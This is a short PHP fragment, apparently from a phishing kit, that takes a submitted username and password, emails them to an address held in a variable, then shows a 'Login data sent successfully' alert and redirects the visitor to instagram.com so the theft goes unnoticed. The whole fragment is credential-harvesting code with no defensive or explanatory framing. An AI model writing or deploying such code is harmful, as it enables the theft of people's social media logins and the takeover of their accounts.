...
if (!empty($username) and !empty($passcode)) {
    ...
    if (mail($to, $subject, $txt)) {
        echo "<script type='text/javascript'>alert('Login data sent successfully. Redirecting...');
            window.location.replace('https://www.instagram.com');
            </script>";
    } else {
         echo "<script type='text/javascript'>alert('Error ! Unable to send mail');
            window.history.go(-1);
            </script>";
    }
